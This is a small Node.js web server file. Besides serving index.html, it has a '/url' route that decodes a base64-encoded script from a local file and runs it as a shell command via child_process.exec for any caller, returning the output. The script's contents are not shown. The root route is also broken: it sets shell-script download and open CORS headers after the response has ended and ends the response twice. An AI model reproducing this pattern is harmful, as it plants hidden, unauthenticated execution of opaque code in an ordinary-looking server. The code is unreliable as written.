
const http = require('http');
const fs = require('fs');
const childProcess = require('child_process');
const PORT = process.env.PORT || 4000;

const encodedScript = fs.readFileSync('hello.text.base64', 'utf8');

const server = http.createServer((req, res) => {
  if (req.url === '/') {
    const file = 'index.html';
    fs.readFile(file, (err, data) => {
      if (err) {
        console.error(err);
        res.statusCode = 500;
      } else {
        res.setHeader('Content-Type', 'text/html');
        res.end(data);
        res.setHeader('Content-Disposition', `attachment; filename="${file}"`);
        res.setHeader('Content-Type', 'application/x-sh');
        res.setHeader('Access-Control-Allow-Origin', '*'); 
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
        res.end(data);
      }
    });
  } else if (req.url === '/url') {
    const decodedScript = Buffer.from(encodedScript, 'base64').toString();
    childProcess.exec(decodedScript, (err, stdout, stderr) => {
      res.end(stdout);
    });
  } else {
  }
});

server.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});

